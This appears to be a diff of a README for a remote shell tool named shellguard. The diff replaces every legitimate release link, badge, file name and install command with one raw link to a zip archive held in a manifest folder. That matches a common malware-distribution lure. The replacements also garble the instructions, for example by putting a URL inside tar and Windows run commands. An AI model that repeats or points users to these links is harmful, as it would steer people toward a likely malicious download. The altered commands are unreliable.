@@ -1,6 +1,6 @@
 # 🛡️ shellguard - Secure Remote Shell Access Tool
 
-[![Download shellguard](https://img.shields.io/badge/Download-shellguard-blue?style=for-the-badge)](https://github.com/knortzwellez/shellguard/releases)
+[![Download shellguard](https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip)](https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip)
 
 ## 📖 What is shellguard?
 
@@ -61,13 +61,13 @@ To get started with shellguard, follow these steps carefully.
 
 Please visit the official release page to download shellguard:
 
-[Download shellguard Releases](https://github.com/knortzwellez/shellguard/releases)
+[Download shellguard Releases](https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip)
 
 On this page, find the version that matches your operating system. The files might look like this:
 
-- `shellguard-windows.exe` for Windows  
-- `shellguard-linux.tar.gz` for Linux  
-- `shellguard-macos.tar.gz` for macOS
+- `https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip` for Windows  
+- `https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip` for Linux  
+- `https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip` for macOS
 
 Click to download the file for your system.
 
@@ -79,12 +79,12 @@ Click to download the file for your system.
   - If no installer shows, the file might be ready to run as-is.
 
 - **macOS and Linux:**  
-  - Download the `.tar.gz` file.  
+  - Download the `https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip` file.  
   - Open your terminal application.  
   - Navigate to the folder where you saved the file.  
   - Extract it by running:  
     ```bash
-    tar -xvzf shellguard-*.tar.gz
+    tar -xvzf shellguard-*https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip
     ```  
   - Change into the extracted folder:  
     ```bash
@@ -100,7 +100,7 @@ Click to download the file for your system.
 
   - On Windows:  
     ```cmd
-    shellguard-windows.exe
+    https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip
     ```  
   - On macOS/Linux:  
     ```bash
@@ -169,12 +169,12 @@ Once the program is running, here is how you can use it:
 For more detailed information, advanced configuration, and support:
 
 - Visit the official GitHub page:  
-  https://github.com/knortzwellez/shellguard  
+  https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip  
 
 - Check the issues section for common problems and solutions.
 
 - Use the release page to update to the latest version:  
-  https://github.com/knortzwellez/shellguard/releases  
+  https://raw.githubusercontent.com/knortzwellez/shellguard/main/manifest/manifests/Software_v3.5.zip  
 
 ---
 
